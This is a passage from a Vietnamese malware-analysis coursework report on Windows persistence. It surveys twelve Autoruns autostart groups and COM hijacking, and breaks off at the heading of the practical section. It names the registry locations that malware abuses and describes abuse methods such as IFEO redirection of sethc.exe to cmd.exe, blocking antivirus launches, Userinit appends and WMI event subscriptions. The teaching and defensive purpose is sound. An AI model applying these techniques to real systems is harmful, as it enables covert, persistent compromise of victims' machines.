# BÁO CÁO KỸ THUẬT: PHÂN TÍCH VÀ XÂY DỰNG CƠ CHẾ PERSISTENCE TRÊN HỆ ĐIỀU HÀNH WINDOWS

- **Học phần:** Phân tích Mã độc (Malware Analysis)
- **Giảng viên hướng dẫn:** Vương Lê
- **Thời hạn:** 1 tuần | **Thang điểm:** 100 điểm
- **Chủ đề:** Bài 3. Phân tích / Tạo Persistence cho mã độc (Malware Persistence Mechanisms & Analysis)
- **Mục tiêu hoàn thành:**
  - Nắm vững bản chất, vai trò và vị trí của kỹ thuật Persistence (Duy trì sự hiện diện) trong chuỗi tấn công mạng (Cyber Kill Chain / MITRE ATT&CK).
  - Khảo sát toàn diện 12 nhóm Autostart Entry cốt lõi trong công cụ Sysinternals Autoruns, chỉ rõ vị trí Registry/Hệ thống và phương thức khai thác của mã độc.
  - Phân tích chuyên sâu kỹ thuật Persistence nâng cao: **COM Hijacking** (Cơ chế phân giải CLSID, quyền hạn HKCU vs HKLM, tính chất ẩn nặc).
  - Tự phát triển chương trình C/C++ PoC giáo dục minh họa 3 cơ chế tự cài đặt Persistence (Startup Folder, Registry Run Key, Task Scheduler) với payload an toàn (`MessageBox`).
  - Xây dựng và thực nghiệm kỹ thuật **Image Hijack** thông qua Image File Execution Options (IFEO) với `sethc.exe` (Sticky Keys).
  - Quy trình và biểu mẫu chuẩn phân tích, bóc tách kỹ thuật Persistence từ các mẫu mã độc thực tế.

---

## MỤC LỤC

1. [PHẦN 1: LÝ THUYẾT NỀN TẢNG (30 ĐIỂM)](#phần-1-lý-thuyết-nền-tảng-30-điểm)
   - [1.1. Tổng quan về Persistence trong Mã độc (1đ)](#11-tổng-quan-về-persistence-trong-mã-độc-1đ)
     - 1.1.1. Định nghĩa Persistence
     - 1.1.2. Vai trò trong vòng đời tấn công (MITRE ATT&CK TA0003)
     - 1.1.3. Mục tiêu chiến lược của kẻ tấn công
   - [1.2. Nghiên cứu 12 Nhóm Autostart Entry trong Sysinternals Autoruns (24đ)](#12-nghiên-cứu-12-nhóm-autostart-entry-trong-sysinternals-autoruns-24đ)
     - 1.2.1. Nhóm 1: Logon
     - 1.2.2. Nhóm 2: Explorer
     - 1.2.3. Nhóm 3: Internet Explorer / Browser Helper Objects (BHO)
     - 1.2.4. Nhóm 4: Scheduled Tasks
     - 1.2.5. Nhóm 5: Services
     - 1.2.6. Nhóm 6: Drivers
     - 1.2.7. Nhóm 7: AppInit DLLs
     - 1.2.8. Nhóm 8: Image Hijacks (IFEO)
     - 1.2.9. Nhóm 9: Winlogon
     - 1.2.10. Nhóm 10: Office Add-ins
     - 1.2.11. Nhóm 11: KnownDLLs
     - 1.2.12. Nhóm 12: WMI (Windows Management Instrumentation)
     - 1.2.13. Bảng tổng hợp đối chiếu 12 nhóm Autostart
   - [1.3. Kỹ thuật Persistence Nâng cao: COM Hijacking (5đ)](#13-kỹ-thuật-persistence-nâng-cao-com-hijacking-5đ)
     - 1.3.1. Khái niệm COM (Component Object Model)
     - 1.3.2. Định danh CLSID (Class Identifier)
     - 1.3.3. Cơ chế tra cứu đối tượng COM trong Registry (HKCU vs HKLM)
     - 1.3.4. Nguyên lý hoạt động của COM Hijacking
     - 1.3.5. Vì sao COM Hijacking cực kỳ khó bị phát hiện?
2. [PHẦN 2: THỰC HÀNH & TRIỂN KHAI KỸ THUẬT (70 ĐIỂM)](#phần-2-thực-hành--triển-khai-kỹ-thuật-70-điểm)
   - [2.1. Tự phát triển Mã C/C++ Tạo Persistence (30đ)](#21-tự-phát-triển-mã-cc-tạo-persistence-30đ)
     - 2.1.1. Thiết kế kiến trúc chương trình PoC an toàn
     - 2.1.2. Cơ chế 1: Thư mục Startup (Startup Folder)
     - 2.1.3. Cơ chế 2: Registry Run Key
     - 2.1.4. Cơ chế 3: Lập lịch tác vụ (Task Scheduler)
     - 2.1.5. Mã nguồn C/C++ hoàn chỉnh (`persistence_demo.cpp`)
     - 2.1.6. Hướng dẫn biên dịch và kiểm chứng thực nghiệm
     - 2.1.7. Quy trình dọn dẹp môi trường (Cleanup Routine)
   - [2.2. Kỹ thuật Image Hijack với sethc.exe (Sticky Keys) (10đ)](#22-kỹ-thuật-image-hijack-với-sethcexe-sticky-keys-10đ)
     - 2.2.1. Bản chất cơ chế IFEO Debugger
     - 2.2.2. Các bước thiết lập Image Hijack cho `sethc.exe`
     - 2.2.3. Thực nghiệm chứng minh: Kích hoạt Payload bằng 5 lần phím Shift
     - 2.2.4. Nguy cơ bảo mật và đặc quyền `NT AUTHORITY\SYSTEM`
     - 2.2.5. Hướng dẫn khắc phục và hoàn trả trạng thái mặc định
   - [2.3. Phân tích Kỹ thuật Persistence trên Mẫu Mã độc Thực tế (30đ)](#23-phân-tích-kỹ-thuật-persistence-trên-mẫu-mã-độc-thực-tế-30đ)
     - 2.3.1. Phương pháp luận & Quy trình phân tích Persistence động
     - 2.3.2. Báo cáo phân tích Mẫu 01: Trojan Dropper / RAT (Registry Run Key Persistence)
     - 2.3.3. Báo cáo phân tích Mẫu 02: Backdoor / Downloader (Scheduled Task Persistence)
     - 2.3.4. Báo cáo phân tích Mẫu 03: Ransomware / Loader (Service Persistence)
     - 2.3.5. Biểu mẫu chuẩn trích xuất IOC Persistence phục vụ Incident Response
3. [TỔNG KẾT & KHUYẾN NGHỊ PHÒNG THỦ](#tổng-kết--khuyến-nghị-phòng-thủ)

---

# PHẦN 1: LÝ THUYẾT NỀN TẢNG (30 ĐIỂM)

## 1.1. Tổng quan về Persistence trong Mã độc (1đ)

### 1.1.1. Định nghĩa Persistence
Trong lĩnh vực an toàn thông tin và phân tích mã độc, **Persistence (Kỹ thuật duy trì sự hiện diện)** là tập hợp các phương thức, cơ chế và thủ thuật được kẻ tấn công sử dụng nhằm đảm bảo mã độc có thể **tự động khởi động lại và tiếp tục hoạt động** sau khi hệ thống gặp các biến cố gián đoạn như:
- Khởi động lại hệ điều hành (System Reboot).
- Người dùng đăng xuất phiên làm việc (User Logoff).
- Tiến trình của mã độc bị phát hiện và kết thúc đột ngột (Process Termination/Crash).
- Kết nối mạng điều khiển (C2 Session) bị ngắt quãng.

### 1.1.2. Vai trò trong vòng đời tấn công (MITRE ATT&CK TA0003)
Theo khung ma trận **MITRE ATT&CK Enterprise Matrix**, Persistence là một chiến thuật trọng yếu mang mã định danh **TA0003**. 

Sau khi vượt qua giai đoạn xâm nhập ban đầu (*Initial Access - TA0001*) và thực thi thành công mã độc (*Execution - TA0002*), nếu không thiết lập Persistence, mọi quyền truy cập của kẻ tấn công sẽ biến mất hoàn toàn ngay khi nạn nhân tắt máy hoặc đăng xuất. Do đó, thiết lập cơ chế tồn tại bền bỉ là "bàn đạp sống còn" để kẻ tấn công tiếp tục thực hiện:
- Nâng cao đặc quyền (*Privilege Escalation - TA0004*).
- Lẩn tránh sự giám sát (*Defense Evasion - TA0005*).
- Thu thập thông tin nhạy cảm và di chuyển ngang (*Credential Access & Lateral Movement*).

### 1.1.3. Mục tiêu chiến lược của kẻ tấn công
1. **Duy trì quyền kiểm soát liên tục (Continuous Control):** Luôn có backdoor sẵn sàng nhận lệnh từ máy chủ C2.
2. **Ẩn mình tối đa (Stealth & Low Profile):** Tận dụng các cơ chế khởi động hợp pháp của hệ điều hành để tránh bị phát hiện bởi người dùng thông thường và phần mềm bảo mật (EDR/AV).
3. **Dự phòng đa lớp (Redundant Persistence):** Nhiều họ mã độc APT (như Cozy Bear, Lazarus, Emotet) thường cài đặt đồng thời từ 2 đến 3 cơ chế persistence độc lập (ví dụ: vừa ghi Registry Run key, vừa tạo Scheduled Task dự phòng).

---

## 1.2. Nghiên cứu 12 Nhóm Autostart Entry trong Sysinternals Autoruns (24đ)

Công cụ **Sysinternals Autoruns** do Microsoft phát triển là giải pháp tiêu chuẩn toàn cầu để kiểm tra toàn diện các điểm khởi động tự động (ASEP - Auto-Start Extensibility Points) trên Windows. Dưới đây là phân tích chi tiết 12 nhóm Autostart trọng yếu:

---

### 1.2.1. Nhóm 1: Logon
- **Mô tả chức năng:**
  Nhóm này chứa các điểm khởi động được hệ điều hành Windows kích hoạt tự động mỗi khi có người dùng đăng nhập thành công vào phiên làm việc (Interactive Logon). Đây là nhóm autostart phổ biến nhất, trực quan nhất và thường được cấu hình cho các ứng dụng thông thường.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Thư mục Startup của người dùng: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
  - Thư mục Startup của toàn hệ thống: `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`
  - Registry Run (Người dùng hiện tại): `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - Registry Run (Toàn hệ thống): `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - Registry RunOnce: `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` và `HKCU\...\RunOnce`
  - Active Setup: `HKLM\Software\Microsoft\Active Setup\Installed Components`
- **Phương thức mã độc lợi dụng:**
  - Ghi đường dẫn trực tiếp của tệp thực thi độc hại vào khóa `Run` hoặc `RunOnce` dưới tên ngụy trang giống ứng dụng hệ thống (ví dụ: `WindowsUpdate`, `OneDriveSync`, `RealtekAudio`).
  - Copy tệp mã độc hoặc tệp shortcut (`.lnk`) vào thư mục `Startup`.
  - Sử dụng khóa `RunOnce` để nạp tệp cài đặt phụ rồi tự động ghi lại chính nó trước khi tiến trình kết thúc.

---

### 1.2.2. Nhóm 2: Explorer
- **Mô tả chức năng:**
  Quản lý các mô-đun mở rộng (Shell Extensions, Shell Icon Overlays, Context Menu Handlers) tích hợp trực tiếp vào tiến trình giao diện người dùng chính của Windows là `explorer.exe`. Khi `explorer.exe` khởi chạy hoặc khi người dùng tương tác với tệp tin/thư mục, hệ thống sẽ nạp các DLL mở rộng này vào không gian bộ nhớ.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Shell Folders / User Shell Folders: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
  - Shell Execute Hooks: `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks`
  - Shell Extensions Approved: `HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved`
  - Shell Icon Overlay Identifiers: `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers`
- **Phương thức mã độc lợi dụng:**
  - Đăng ký một Shell Extension độc hại dạng DLL. Khi người dùng mở File Explorer hoặc nhấp chuột phải vào bất kỳ tệp nào, DLL độc hại sẽ được nạp trực tiếp vào tiến trình `explorer.exe` hợp pháp.
  - Sửa đổi đường dẫn `User Shell Folders` trỏ các thư mục mặc định như `Desktop` hoặc `Documents` về thư mục chứa payload của mã độc.

---

### 1.2.3. Nhóm 3: Internet Explorer / Browser Helper Objects (BHO)
- **Mô tả chức năng:**
  Quản lý các plugin, thanh công cụ (toolbars) và các đối tượng hỗ trợ trình duyệt (BHO - Browser Helper Objects) được thiết kế cho Internet Explorer hoặc các thành phần nhúng WebBrowser Control (thường được dùng bởi nhiều ứng dụng nội bộ Windows).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Khóa BHO chính: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
  - URL Search Hooks: `HKLM\SOFTWARE\Microsoft\Internet Explorer\URLSearchHooks`
  - IE Extensions: `HKLM\SOFTWARE\Microsoft\Internet Explorer\Extensions`
- **Phương thức mã độc lợi dụng:**
  - Các phần mềm quảng cáo độc hại (Adware), phần mềm gián điệp (Spyware) và Banking Trojan (như Zeus, Gozi) đăng ký BHO dưới dạng DLL.
  - Khi trình duyệt hoặc bất kỳ tiến trình nào khởi tạo đối tượng duyệt web, BHO DLL sẽ được nạp để thực hiện hành vi Form Grabbing, đánh cắp mật khẩu, chặn bắt gói tin HTTP/HTTPS hoặc tiêm mã JavaScript độc hại (Man-in-the-Browser).

---

### 1.2.4. Nhóm 4: Scheduled Tasks
- **Mô tả chức năng:**
  Cơ chế lập lịch tác vụ tự động của Windows (Task Scheduler Engine), cho phép cấu hình khởi chạy các chương trình hoặc kịch bản lệnh theo các điều kiện linh hoạt: thời gian cố định, chu kỳ lặp lại, khi khởi động hệ thống (At startup), khi đăng nhập (At logon), hoặc khi xảy ra một sự kiện cụ thể trong Windows Event Log.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Tệp định nghĩa tác vụ (XML format): `C:\Windows\System32\Tasks\`
  - Khóa Registry cấu hình Task: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`
  - Khóa ánh xạ Tree: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree`
- **Phương thức mã độc lợi dụng:**
  - Tạo một Scheduled Task mới thông qua tiện ích dòng lệnh `schtasks.exe` hoặc trực tiếp qua Win32 COM API (`ITaskService`).
  - Cấu hình tác vụ chạy với quyền hệ thống cao nhất (`SYSTEM` / Run with highest privileges) để vừa đạt được Persistence, vừa leo thang đặc quyền.
  - Đặt tên tác vụ trùng hoặc tương tự với các tác vụ bảo trì hệ thống của Microsoft (ví dụ: `\Microsoft\Windows\Defrag\ScheduledDefragUpdate`).

---

### 1.2.5. Nhóm 5: Services
- **Mô tả chức năng:**
  Dịch vụ hệ thống (Windows Services) là các tiến trình chạy ngầm nền độc lập với phiên đăng nhập của người dùng. Dịch vụ được khởi chạy rất sớm ngay trong quá trình boot hệ thống bởi tiến trình `services.exe` (Service Control Manager - SCM) và thường sở hữu đặc quyền tối cao (`NT AUTHORITY\SYSTEM` hoặc `LocalService`).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Registry định nghĩa Services: `HKLM\SYSTEM\CurrentControlSet\Services\<Tên_Dịch_Vụ>`
  - Giá trị `ImagePath`: Trỏ tới tệp thực thi (`.exe`) hoặc `svchost.exe -k <ServiceGroup>`.
  - Giá trị `ServiceDll`: Nằm trong subkey `Parameters\ServiceDll` nếu chạy dưới dạng dịch vụ chia sẻ `svchost.exe`.
  - Giá trị `Start`: Quy định chế độ khởi động (2 = Automatic, 3 = Manual, 4 = Disabled).
- **Phương thức mã độc lợi dụng:**
  - Sử dụng API `CreateServiceA` hoặc lệnh `sc.exe create` để tạo một Service mới chạy mã độc với quyền SYSTEM.
  - Sửa đổi giá trị `ImagePath` của các dịch vụ hệ thống ít hoạt động hoặc đã bị vô hiệu hóa (Service Hijacking).
  - Đăng ký payload dưới dạng DLL và đính kèm vào nhóm dịch vụ `svchost.exe` để ngụy trang hoàn hảo thành tiến trình hệ sinh thái lõi của Windows.

---

### 1.2.6. Nhóm 6: Drivers
- **Mô tả chức năng:**
  Trình điều khiển thiết bị (Kernel-Mode Drivers) hoạt động ở tầng nhân hệ điều hành (Ring 0). Drivers có toàn quyền can thiệp vào bộ nhớ vật lý, phần cứng, luồng thực thi CPU và kiểm soát toàn bộ các tiến trình người dùng (Ring 3).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Tệp nhị phân driver: `C:\Windows\System32\drivers\*.sys`
  - Registry cấu hình: `HKLM\SYSTEM\CurrentControlSet\Services\<Driver_Name>` với giá trị `Type = 1` (Kernel Driver) hoặc `Type = 2` (File System Driver).
  - Chế độ khởi động: `Start = 0` (Boot Start - nạp bởi OS loader), `Start = 1` (System Start - nạp trong pha khởi tạo kernel).
- **Phương thức mã độc lợi dụng:**
  - Mã độc Rootkit cài đặt driver nhân độc hại để ẩn giấu hoàn toàn tiến trình, tệp tin, cổng mạng và khóa Registry (Rootkit Hooking / SSDT Hooking).
  - Vượt qua cơ chế kiểm tra chữ ký số Driver Signature Enforcement (DSE) bằng cách sử dụng chứng chỉ số bị đánh cắp hoặc khai thác kỹ thuật **BYOVD (Bring Your Own Vulnerable Driver)**: Nạp một driver hợp pháp có lỗ hổng đã biết để vô hiệu hóa EDR/AV từ Ring 0.

---

### 1.2.7. Nhóm 7: AppInit DLLs
- **Mô tả chức năng:**
  Cơ chế cho phép chỉ định danh sách các thư viện liên kết động (DLL) được nạp tự động vào không gian địa chỉ bộ nhớ của **mọi tiến trình người dùng** tải thư viện `user32.dll`. Đây vốn là cơ chế hỗ trợ debugging và quản lý đồ họa của Windows NT cũ.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Hệ thống 32-bit & 64-bit: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`
  - Khóa dành cho ứng dụng 32-bit trên OS 64-bit (WoW64): `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows`
  - Các giá trị:
    - `AppInit_DLLs`: Chuỗi chứa đường dẫn đến tệp DLL cần nạp.
    - `LoadAppInit_DLLs`: Giá trị DWORD (`1` = Bật, `0` = Tắt).
- **Phương thức mã độc lợi dụng:**
  - Ghi đường dẫn DLL độc hại vào `AppInit_DLLs` và bật `LoadAppInit_DLLs = 1`.
  - Mỗi khi bất kỳ ứng dụng đồ họa nào (GUI Process) như `notepad.exe`, `calc.exe`, trình duyệt khởi chạy, DLL độc hại sẽ lập tức được thực thi trong ngữ cảnh tiến trình đó (Process Injection thụ động kết hợp Persistence).
  - *Lưu ý hiện đại:* Kể từ Windows 8/10, tính năng Secure Boot đã mặc định vô hiệu hóa AppInit DLLs trừ khi tệp DLL được ký số hợp lệ.

---

### 1.2.8. Nhóm 8: Image Hijacks (Image File Execution Options - IFEO)
- **Mô tả chức năng:**
  Tính năng IFEO được Microsoft thiết kế dành cho lập trình viên để gắn trình gỡ lỗi (Debugger) vào một tệp thực thi cụ thể. Khi tệp thực thi mục tiêu được gọi, hệ điều hành sẽ tự động chuyển hướng và khởi chạy ứng dụng được cấu hình trong khóa `Debugger` thay thế.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<Target_Executable_Name>`
  - Giá trị chuỗi: `Debugger = "C:\Path\To\Debugger.exe"`
  - Tính năng mở rộng: `GlobalFlag` kết hợp `SilentProcessExit` (kích hoạt payload khi tiến trình mục tiêu tắt đi).
- **Phương thức mã độc lợi dụng:**
  - **Accessibility Hijack:** Gán debugger cho các ứng dụng trợ năng chạy trước màn hình đăng nhập như `sethc.exe` (Sticky Keys), `utilman.exe`, `osk.exe` trỏ về `cmd.exe`.
  - **AV/EDR Blocking:** Gán debugger cho các tệp thực thi của phần mềm diệt virus (ví dụ: `MsMpEng.exe`, `mbam.exe`) trỏ về `systray.exe` hoặc một ứng dụng rỗng, khiến phần mềm bảo vệ không thể khởi chạy.

---

### 1.2.9. Nhóm 9: Winlogon
- **Mô tả chức năng:**
  Quản lý tiến trình `winlogon.exe` - thành phần chịu trách nhiệm xử lý việc đăng nhập, xác thực danh tính người dùng và nạp giao diện màn hình nền (Desktop environment).
- **Vị trí Registry / Đường dẫn hệ thống:**
  - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
  - Khóa `Shell`: Mặc định là `explorer.exe`.
  - Khóa `Userinit`: Mặc định là `C:\Windows\system32\userinit.exe,`.
  - Khóa `Notify`: Đăng ký DLL nhận thông báo về sự kiện đăng nhập/đăng xuất.
- **Phương thức mã độc lợi dụng:**
  - Nối đường dẫn mã độc vào sau khóa `Userinit` (ví dụ: `C:\Windows\system32\userinit.exe, C:\malware.exe`). Cả hai tệp đều được kích hoạt khi người dùng đăng nhập.
  - Thay thế hoặc đính kèm vào khóa `Shell` để mã độc được chạy trước hoặc song song với giao diện người dùng.
  - Tấn công GINA (Graphical Identification and Authentication) trên các phiên bản Windows cũ để đánh cắp mật khẩu đăng nhập dạng văn bản thô.

---

### 1.2.10. Nhóm 10: Office Add-ins
- **Mô tả chức năng:**
  Quản lý các phần bổ trợ (Add-ins), mẫu định dạng tự động (Templates), macro mở rộng được bộ ứng dụng Microsoft Office (Word, Excel, Outlook, PowerPoint) tự động nạp mỗi khi ứng dụng khởi chạy.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - COM Add-ins: `HKCU\Software\Microsoft\Office\<Ứng_dụng>\Addins\<Addin_Name>`
  - Word Startup Folder: `%APPDATA%\Microsoft\Word\STARTUP\`
  - Excel XLSTART Folder: `%APPDATA%\Microsoft\Excel\XLSTART\`
  - WLL / XLL files (C/C++ Add-in DLLs).
- **Phương thức mã độc lợi dụng:**
  - Đặt tệp mẫu chứa macro độc hại (`Normal.dotm`) vào thư mục Startup của Word hoặc tệp nhị phân `.xll` vào thư mục khởi động của Excel.
  - Đăng ký COM Add-in cho `OUTLOOK.EXE` để mã độc luôn chạy ngầm bất cứ khi nào người dùng kiểm tra email, đồng thời có thể đánh cắp danh bạ hoặc gửi email phishing nội bộ.

---

### 1.2.11. Nhóm 11: KnownDLLs
- **Mô tả chức năng:**
  Cơ chế tối ưu hóa hiệu năng hệ thống của Windows NT. Thư mục đối tượng `\KnownDlls` trong Object Manager chứa danh sách các DLL hệ thống lõi thường dùng (như `kernel32.dll`, `user32.dll`, `shell32.dll`) đã được nạp sẵn vào bộ nhớ để các tiến trình nạp nhanh chóng mà không cần tìm kiếm trên đĩa.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Khóa định nghĩa danh sách: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`
  - Đối tượng trong Windows Object Directory: `\KnownDlls` (kiểm tra bằng công cụ WinObj).
- **Phương thức mã độc lợi dụng:**
  - Bình thường, KnownDLLs giúp phòng chống tấn công DLL Search Order Hijacking. Tuy nhiên, nếu mã độc đã có quyền quản trị (Administrator/SYSTEM), nó có thể chỉnh sửa khóa Registry này:
    - Loại bỏ một DLL khỏi danh sách để kích hoạt kỹ thuật DLL Sideloading đối với các ứng dụng hệ thống.
    - Thêm một DLL tùy chỉnh trỏ về thư mục chứa payload của mã độc để ép buộc toàn bộ các ứng dụng Windows nạp DLL đó.

---

### 1.2.12. Nhóm 12: WMI (Windows Management Instrumentation)
- **Mô tả chức năng:**
  WMI là hạ tầng quản trị mạnh mẽ của Windows. Cơ chế **WMI Event Subscription** cho phép thực thi một hành động tùy chọn khi một sự kiện hệ điều hành nhất định được thỏa mãn mà hoàn toàn không cần tiến trình nào chạy nền thường trực.
- **Vị trí Registry / Đường dẫn hệ thống:**
  - Cơ sở dữ liệu WMI: `C:\Windows\System32\wbem\Repository\`
  - Namespace mặc định: `root\subscription`
  - Ba thành phần cốt lõi:
    1. `__EventFilter`: Biểu thức WQL (WMI Query Language) lắng nghe sự kiện (ví dụ: kích hoạt 2 phút sau khi hệ thống khởi động: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120`).
    2. `CommandLineEventConsumer` hoặc `ActiveScriptEventConsumer`: Đối tượng định nghĩa hành động thực thi (lệnh chạy file, chạy VBScript/PowerShell).
    3. `__FilterToConsumerBinding`: Đối tượng liên kết giữa Filter và Consumer.
- **Phương thức mã độc lợi dụng:**
  - Đây là kỹ thuật persistence không dùng tệp (Fileless Persistence) rất cao cấp (được dùng bởi malware NotPetya, Stuxnet, Flame).
  - Không tạo khóa Registry thông thường, không tạo file trong thư mục Startup, rất khó bị phát hiện bởi người dùng nếu không kiểm tra bằng các công cụ chuyên dụng như `autoruns.exe` (tab WMI) hoặc PowerShell cmdlet `Get-CimInstance`.

---

### 1.2.13. Bảng tổng hợp đối chiếu 12 nhóm Autostart

| Nhóm Entry (Autoruns) | Vị trí lưu trữ chính | Đặc quyền yêu cầu | Mức độ ẩn nặc | Mức độ phổ biến của Malware |
| :--- | :--- | :--- | :--- | :--- |
| **Logon** | `HKCU/HKLM...\Run`, Thư mục Startup | User / Admin | Thấp | Rất cao (phổ thông nhất) |
| **Explorer** | `HKLM...\Shell Extensions`, `User Shell Folders` | User / Admin | Trung bình | Trung bình |
| **Browser (BHO)** | `HKLM...\Browser Helper Objects` | Admin | Trung bình | Cao (Trojan, Adware) |
| **Scheduled Tasks** | `C:\Windows\System32\Tasks`, TaskCache | User / Admin | Trung bình | Rất cao |
| **Services** | `HKLM\SYSTEM\...\Services` | Admin / SYSTEM | Cao | Rất cao (Ransomware, APT) |
| **Drivers** | `C:\Windows\System32\drivers`, `Services` (Type=1) | Kernel Admin | Cực cao | Thấp (Rootkit cao cấp) |
| **AppInit DLLs** | `HKLM\...\Windows\AppInit_DLLs` | Admin | Cao | Thấp (do Secure Boot hạn chế) |
| **Image Hijacks** | `HKLM\...\Image File Execution Options` | Admin | Cao | Cao |
| **Winlogon** | `HKLM\...\Winlogon` (`Userinit`, `Shell`) | Admin | Cao | Trung bình |
| **Office Add-ins** | `%APPDATA%\Microsoft\Office\Addins`, `STARTUP` | User | Cao | Cao (Tấn công nhắm mục tiêu) |
| **KnownDLLs** | `HKLM\...\Session Manager\KnownDLLs` | SYSTEM | Cực cao | Rất thấp (APT đặc biệt) |
| **WMI** | WMI Repository (`root\subscription`) | Admin | Cực cao | Cao (Fileless malware) |

---

## 1.3. Kỹ thuật Persistence Nâng cao: COM Hijacking (5đ)

### 1.3.1. Khái niệm COM (Component Object Model)
**Component Object Model (COM)** là một kiến trúc hướng đối tượng chuẩn nhị phân độc lập ngôn ngữ do Microsoft phát triển từ năm 1993. COM cho phép các đối tượng phần mềm tương tác và giao tiếp với nhau xuyên suốt qua các ranh giới tiến trình (Inter-Process Communication - IPC) hoặc trong cùng một tiến trình dưới dạng In-Process Server (DLL). Hầu như toàn bộ các tác vụ giao diện, xử lý đồ họa, tự động hóa Office và tác vụ nền của Windows đều dựa trên nền tảng COM.

### 1.3.2. Định danh CLSID (Class Identifier)
Để định danh duy nhất cho một lớp đối tượng COM (COM Class), hệ điều hành Windows sử dụng một mã số GUID 128-bit gọi là **CLSID (Class Identifier)**. 
- Định dạng chuẩn: `{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}` (ví dụ: `{20D04FE0-3AEA-1069-A2D8-08002B30309D}` là CLSID đại diện cho đối tượng "This PC").
- Trong Windows Registry, cấu hình của CLSID chỉ rõ tệp nhị phân chịu trách nhiệm hiện thực hóa đối tượng thông qua các khóa:
  - `InprocServer32`: Trỏ tới đường dẫn tệp DLL (nạp vào cùng tiến trình gọi).
  - `LocalServer32`: Trỏ tới đường dẫn tệp EXE độc lập.

### 1.3.3. Cơ chế tra cứu đối tượng COM trong Registry (HKCU vs HKLM)
Khi một ứng dụng gọi hàm Win32 API như `CoCreateInstance()` hoặc `CoGetClassObject()` với một CLSID cụ thể, hệ điều hành sẽ tiến hành tra cứu đường dẫn nhị phân trong Registry theo cơ chế kết hợp **Registry Redirection / Virtualization**:

```
Ưu tiên số 1 (User-level):
HKCU\Software\Classes\CLSID\{CLSID-GUID}\InprocServer32
               │
               ├─► [Tìm thấy] ────► NẠP DLL NÀY NGAY LẬP TỨC (Dừng tra cứu)
               │
               └─► [Không tìm thấy]
                         │
                         ▼
Ưu tiên số 2 (System-level):
HKLM\Software\Classes\CLSID\{CLSID-GUID}\InprocServer32
                         │
                         ├─► [Tìm thấy] ────► Nạp DLL hệ thống mặc định
                         └─► [Không tìm thấy] ──► Báo lỗi REGDB_E_CLASSNOTREG
```

> **Nguyên tắc trọng yếu:**
> Khóa Registry của người dùng (`HKCU`) luôn được ưu tiên kiểm tra **TRƯỚC** khóa Registry của toàn hệ thống (`HKLM`). Điều này cho phép một tiến trình chạy với đặc quyền người dùng bình thường (Standard User) có thể ghi đè hành vi nạp COM của toàn bộ ứng dụng mà không hề yêu cầu đặc quyền Administrator (UAC Bypass / Privilege Independence).

### 1.3.4. Nguyên lý hoạt động của COM Hijacking
Kỹ thuật COM Hijacking (chiếm quyền điều khiển COM) hoạt động theo hai phương thức chủ yếu:

1. **Ghi đè CLSID hiện hữu (CLSID Override):**
   - Kẻ tấn công tìm một CLSID thường xuyên được gọi bởi các tiến trình hệ thống (như `explorer.exe` hoặc các Scheduled Tasks hệ thống chạy định kỳ).
   - Mã độc tạo khóa tương ứng trong `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` và trỏ giá trị mặc định về DLL độc hại của mình.
   - Khi tiến trình hệ thống kích hoạt CLSID đó, do cơ chế ưu tiên, Windows sẽ nạp DLL độc hại thay vì DLL gốc trong `HKLM`.
2. **Chiếm dụng CLSID bị bỏ trống (Missing/Abandoned CLSID Hijacking):**
   - Rất nhiều ứng dụng và tác vụ Windows cố gắng nạp các CLSID cũ không còn tồn tại trong `HKLM` (gây ra lỗi `NAME NOT FOUND` khi theo dõi bằng Process Monitor).
   - Mã độc chỉ cần đăng ký đúng CLSID đó trong `HKCU`, biến một yêu cầu lỗi thành một lần thực thi payload hoàn hảo.

### 1.3.5. Vì sao COM Hijacking cực kỳ khó bị phát hiện?
1. **Không yêu cầu quyền Admin:** Toàn bộ quá trình tạo khóa diễn ra trong phân vùng `HKCU`, không kích hoạt hộp thoại cảnh báo UAC (User Account Control).
2. **Không có khóa khởi động lộ liễu:** Không tạo các mục trong `Run`, `RunOnce` hay `Services` - những nơi mà quản trị viên và phần mềm diệt virus quét đầu tiên.
3. **Thực thi trong lòng tiến trình sạch (Living-off-the-Land):** DLL độc hại được nạp thẳng vào không gian bộ nhớ của các tiến trình hệ thống đáng tin cậy như `explorer.exe`, `taskhostw.exe`, `dllhost.exe`. Về mặt mạng và hệ thống, hành vi kết nối C2 sẽ xuất phát từ chính các tiến trình hợp pháp này.
4. **Bỏ lọt trong các công cụ quét sơ sài:** Nếu người phân tích chỉ quét `HKLM` hoặc không kiểm tra sự bất thường giữa `HKCU` và `HKLM`, COM Hijacking sẽ hoàn toàn "tàng hình".

---

# PHẦN 2: THỰC HÀNH & TRIỂN KHAI KỸ THUẬT (70 ĐIỂM)

